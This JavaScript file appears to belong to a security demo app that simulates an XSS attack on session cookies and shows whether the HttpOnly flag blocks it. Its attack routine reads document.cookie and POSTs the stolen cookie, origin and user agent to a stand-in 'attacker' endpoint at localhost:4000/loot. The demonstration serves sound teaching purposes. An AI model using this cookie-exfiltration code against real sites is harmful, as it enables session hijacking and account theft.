/**
 * Attack Simulation Script (VeloTech PoC Exploit Demonstrator)
 * 
 * Simulates a Cross-Site Scripting (XSS) or Malicious Script attempting to
 * access and exfiltrate the active user's session cookie via `document.cookie`.
 * 
 * Flow A (Vulnerable): Cookie has NO HttpOnly flag -> document.cookie is readable and exfiltrated!
 * Flow B (Secure): Cookie HAS HttpOnly flag -> document.cookie cannot read the session cookie (blocked).
 */

async function executeAttackSimulation() {
  console.log('[*] Exploit Script Triggered: Attempting to read document.cookie...');
  const rawCookie = document.cookie;
  const hasSessionCookie = rawCookie.includes('session=');

  const attackerUrl = 'http://localhost:4000/loot';

  // Create or retrieve Exploit Inspector output modal/toast
  if (hasSessionCookie) {
    // Flow A: Vulnerability Confirmed!
    console.error('🚨 [VULNERABILITY DETECTED] Stolen Cookie:', rawCookie);

    // Attempt exfiltration to the attacker server
    let exfiltrated = false;
    try {
      await fetch(attackerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cookie: rawCookie,
          origin: window.location.origin,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        }),
        mode: 'cors'
      });
      exfiltrated = true;
    } catch (err) {
      console.warn('[-] Attacker server (port 4000) not reached or offline:', err.message);
    }

    showExploitModal({
      title: '🚨 EXPLOIT SUCCESSFUL (Vulnerable Flow A)',
      status: 'CRITICAL VULNERABILITY',
      isVulnerable: true,
      cookie: rawCookie,
      details: `JavaScript read the session cookie via <code>document.cookie</code> because the <strong>HttpOnly</strong> flag was omitted.<br><br>` +
        (exfiltrated
          ? `<strong>Data Exfiltrated:</strong> Stolen session token sent to Attacker C2 server at <code>${attackerUrl}</code>.`
          : `<strong>Data Read:</strong> Cookie was read by client-side JS (Attacker C2 server at <code>${attackerUrl}</code> was offline).`),
      mitigation: 'Enable <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Strict</code> flags on the session cookie.'
    });

  } else {
    // Flow B: Mitigation Verified!
    console.log('🛡️ [DEFENSE ACTIVE] document.cookie is shielded by HttpOnly:', rawCookie || '(empty)');

    showExploitModal({
      title: '🛡️ EXPLOIT BLOCKED (Secure Flow B)',
      status: 'PROTECTED (NIST AAL2)',
      isVulnerable: false,
      cookie: rawCookie || '(none readable via JavaScript)',
      details: `The malicious script attempted to read <code>document.cookie</code>, but the browser returned nothing for the session token.<br><br>` +
        `Because the cookie was issued with the <strong>HttpOnly</strong> flag, the browser strictly forbids JavaScript from accessing it, preventing session theft via XSS or AitM script injection.`,
      mitigation: 'Security controls are functioning properly.'
    });
  }
}

// Render dynamic modal showing the attack demonstration results
function showExploitModal(data) {
  let backdrop = document.getElementById('exploit-modal-backdrop');
  if (!backdrop) {
    backdrop = document.createElement('div');
    backdrop.id = 'exploit-modal-backdrop';
    backdrop.className = 'modal-backdrop';
    document.body.appendChild(backdrop);
  }

  backdrop.innerHTML = `
    <div class="modal-dialog">
      <div class="modal-header">
        <span class="auth-badge ${data.isVulnerable ? 'badge-red' : 'badge-green'}">${data.status}</span>
        <button class="modal-close" onclick="closeExploitModal()">&times;</button>
      </div>
      <h3 style="color: ${data.isVulnerable ? 'var(--accent-red)' : 'var(--accent-neon)'}; margin-bottom: 0.75rem; font-size: 1.25rem;">
        ${data.title}
      </h3>
      <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 1.25rem; line-height: 1.5;">
        ${data.details}
      </p>

      <div style="margin-bottom: 1rem;">
        <label style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-dim); font-weight: 600; display: block; margin-bottom: 0.35rem;">
          document.cookie Output:
        </label>
        <div style="background: #090c10; border: 1px solid ${data.isVulnerable ? 'rgba(255,69,58,0.4)' : 'rgba(0,255,157,0.3)'}; padding: 0.75rem; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 0.85rem; color: ${data.isVulnerable ? '#FF7B72' : 'var(--accent-neon)'}; word-break: break-all;">
          ${escapeHtml(data.cookie)}
        </div>
      </div>

      <div style="display: flex; gap: 0.75rem; justify-content: flex-end; margin-top: 1.5rem;">
        <button class="btn btn-secondary" onclick="closeExploitModal()" style="width: auto; padding: 0.5rem 1.2rem;">Close</button>
        ${data.isVulnerable ? '<a href="/login-secure" class="btn btn-primary" style="width: auto; padding: 0.5rem 1.2rem;">Switch to Secure Flow</a>' : ''}
      </div>
    </div>
  `;

  setTimeout(() => backdrop.classList.add('open'), 10);
}

function closeExploitModal() {
  const backdrop = document.getElementById('exploit-modal-backdrop');
  if (backdrop) {
    backdrop.classList.remove('open');
  }
}

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// Export for global browser use
window.executeAttackSimulation = executeAttackSimulation;
window.closeExploitModal = closeExploitModal;
